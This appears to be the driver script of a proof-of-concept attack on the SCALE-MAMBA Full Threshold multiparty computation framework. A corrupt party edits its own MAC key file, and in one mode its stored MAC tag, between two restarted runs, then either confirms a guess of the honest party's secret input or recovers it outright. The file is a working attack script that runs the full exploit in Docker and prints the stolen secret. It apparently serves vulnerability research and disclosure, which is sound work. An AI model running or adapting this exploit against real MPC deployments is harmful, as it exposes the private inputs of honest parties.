#!/usr/bin/env bash
# Off-key cross-run MAC-key-inconsistency attack on SCALE-MAMBA Full Threshold.
#
# One entry point for both circuits and both attack strengths. Both parties run
# the SAME, UNMODIFIED Player binary and the SAME .mpc programs. The only
# adversarial action is Player 1 editing its own files (Data/MKey-1.key, and for
# the selective attack its Memory-P1 MAC tag) between two runs of the supported
# `-memory old` restart path.
#
# Usage:
#   ./run-attack.sh --circuit mult|affine --attack selective|recovery \
#                   --real-y N [--guess-of-y G] [--x X]
#
#   --circuit      mult   f(x, y) = x*y; the attacker fixes x=0 (output always 0).
#                  affine f(x; (y, r)) = x*y + r, r a uniform input of the honest
#                         party (output hides y).
#   --attack       selective  guess y; run 2 completes iff the guess is correct.
#                  recovery   read y outright from the unmasked MAC check (no guess).
#   --real-y  N    the honest party's secret y.
#   --guess-of-y G the attacker's guess of y (required for selective).
#   --x       X    the attacker's input x (affine only; default 1; mult fixes x=0).
#
# FAKE=1 uses the fast trusted-dealer offline (seconds); the default is the real
# FHE/BGV offline (minutes per run under x86 emulation).
#
# Examples:
#   ./run-attack.sh --circuit mult   --attack selective --guess-of-y 5 --real-y 5
#   ./run-attack.sh --circuit mult   --attack recovery  --real-y 12345
#   ./run-attack.sh --circuit affine --attack selective --guess-of-y 1 --real-y 1
#   ./run-attack.sh --circuit affine --attack recovery  --real-y 12345 --x 3
set -euo pipefail
cd "$(dirname "$0")"

usage() {
  echo "Usage: ./run-attack.sh --circuit mult|affine --attack selective|recovery --real-y N [--guess-of-y G] [--x X]" >&2
}

CIRCUIT=""; ATTACK=""; REAL_Y=""; GUESS_OF_Y=""; X=""
while [ $# -gt 0 ]; do
  case "$1" in
    --circuit)     CIRCUIT="$2"; shift 2;;
    --attack)      ATTACK="$2"; shift 2;;
    --real-y)      REAL_Y="$2"; shift 2;;
    --guess-of-y)  GUESS_OF_Y="$2"; shift 2;;
    --x)           X="$2"; shift 2;;
    -h|--help)     grep '^#' "$0" | cut -c3-; exit 0;;
    *) echo "error: unknown option '$1'" >&2; usage; exit 2;;
  esac
done

case "$CIRCUIT" in mult|affine) ;; *) echo "error: --circuit must be 'mult' or 'affine'" >&2; usage; exit 2;; esac
case "$ATTACK"  in selective|recovery) ;; *) echo "error: --attack must be 'selective' or 'recovery'" >&2; usage; exit 2;; esac
[ -n "$REAL_Y" ] || { echo "error: --real-y is required" >&2; usage; exit 2; }
if [ "$ATTACK" = selective ] && [ -z "$GUESS_OF_Y" ]; then
  echo "error: --guess-of-y is required for --attack selective" >&2; exit 2
fi
if [ "$ATTACK" = recovery ] && [ -n "$GUESS_OF_Y" ]; then
  echo "note: --guess-of-y is ignored for --attack recovery" >&2
fi
if [ "$CIRCUIT" = mult ] && [ -n "$X" ]; then
  echo "note: --x is ignored for --circuit mult (the attacker fixes x=0)" >&2
fi
X=${X:-1}

IMAGE=scale-mamba-attack
CONTAINER=scale-mamba-attack-run

echo "=== Off-Key Cross-Run Attack on SCALE-MAMBA (Full Threshold) ==="
echo "Circuit: $CIRCUIT    Attack: $ATTACK"
echo "Honest party's real y: $REAL_Y"
[ "$ATTACK" = selective ] && echo "Attacker's guess of y: $GUESS_OF_Y"
[ "$CIRCUIT" = affine ] && echo "Attacker's input x:    $X   (output x*y+r is masked by the honest party's r)"
[ "${FAKE:-0}" = 1 ] && echo "Offline: trusted-dealer (FAKE=1, fast)" || echo "Offline: FHE/BGV (real)"
echo

# 1. Build the pinned, patched SCALE-MAMBA image if needed.
if ! docker image inspect "$IMAGE" >/dev/null 2>&1; then
  echo "--- Building $IMAGE (one-time, ~15-20 min) ---"
  docker build --platform linux/amd64 -t "$IMAGE" .
fi

# 2. Fresh container from the clean image.
cleanup() { docker rm -f "$CONTAINER" >/dev/null 2>&1 || true; }
trap cleanup EXIT
cleanup
docker run -d --name "$CONTAINER" --platform linux/amd64 "$IMAGE" sleep infinity >/dev/null

# Sync current scripts so edits to poc.sh / patcher.py take effect without a rebuild.
docker cp poc.sh     "$CONTAINER":/scale/poc/poc.sh >/dev/null
docker cp patcher.py "$CONTAINER":/scale/poc/patcher.py >/dev/null

# r must be uniform; SCALE-MAMBA's clear input path is 64-bit, so sample 64 bits
# (the attack is independent of r's distribution). Only used for the affine circuit.
R=$(python3 -c "import secrets; print(secrets.randbits(64))")

# The affine programs are compiled at runtime so edits take effect without a rebuild.
if [ "$CIRCUIT" = affine ]; then
  [ "$ATTACK" = recovery ] && PROGDIR=attack_affine_recover || PROGDIR=attack_affine
  docker exec "$CONTAINER" bash -lc "mkdir -p /scale/Programs/$PROGDIR" >/dev/null
  docker cp "Programs/$PROGDIR/$PROGDIR.mpc" "$CONTAINER":/scale/Programs/"$PROGDIR"/"$PROGDIR".mpc >/dev/null
  docker exec "$CONTAINER" bash -lc "cd /scale && ./compile-new.sh Programs/$PROGDIR >/dev/null 2>&1" || true
  echo "Honest party's mask:   r = $R   (uniform 64-bit, hidden from the attacker)"
  echo
fi

poc() {
  docker exec -e FAKE="${FAKE:-0}" -e QUIET=1 -e AFF_X="$X" -e AFF_R="$R" \
    "$CONTAINER" bash -lc "bash /scale/poc/poc.sh $*"
}

echo "--- Run 1: honest party stores its secret y (authenticated under MAC key alpha) ---"
poc store "$REAL_Y"
echo

report_selective() {   # $1 = complete|abort
  echo "=== RESULT ==="
  if [ "$1" = complete ]; then
    echo "Protocol COMPLETED  ->  guess CORRECT  ->  the attacker learns y == $GUESS_OF_Y"
  else
    echo "Protocol ABORTED (mac_fail)  ->  guess WRONG  ->  the attacker learns y != $GUESS_OF_Y"
  fi
}

report_recovery() {   # $1 = recovered value (may be empty)
  echo "=== RESULT ==="
  if [ -n "$1" ]; then
    echo "The attacker recovered the honest party's secret: y = $1"
    if [ "$1" = "$REAL_Y" ]; then
      echo "(matches the true secret $REAL_Y, recovered in a single run)"
    else
      echo "(true secret was $REAL_Y; recovered value differs, inspect the logs)"
    fi
  else
    echo "No recovery line found; inspect the run output above."
  fi
}

if [ "$ATTACK" = selective ]; then
  echo "--- Run 2: attacker restarts (alpha_1 += 1, adds guess g=$GUESS_OF_Y to y's MAC) ---"
  if [ "$CIRCUIT" = mult ]; then
    if poc open   "guess:$GUESS_OF_Y"; then v=complete; else v=abort; fi
  else
    if poc affine "guess:$GUESS_OF_Y"; then v=complete; else v=abort; fi
  fi
  echo; report_selective "$v"
else
  echo "--- Run 2: attacker restarts (alpha_1 += 1) and inverts the unmasked check ---"
  if [ "$CIRCUIT" = mult ]; then
    out="$(poc recover 0)"
  else
    out="$(poc affine-recover 0)"
  fi
  echo "$out" | sed 's/^/  /'
  REC="$(printf '%s\n' "$out" | sed -n 's/.*RECOVERED_Y=\([0-9-]*\).*/\1/p' | head -1)"
  echo; report_recovery "$REC"
fi

echo
echo "The honest party (P0) ran the unmodified Player binary in both runs; only"
echo "P1's own files were edited between them. The opened output reveals nothing"
echo "about y (mult: x*y=0; affine: x*y+r masked by the honest party's r)."
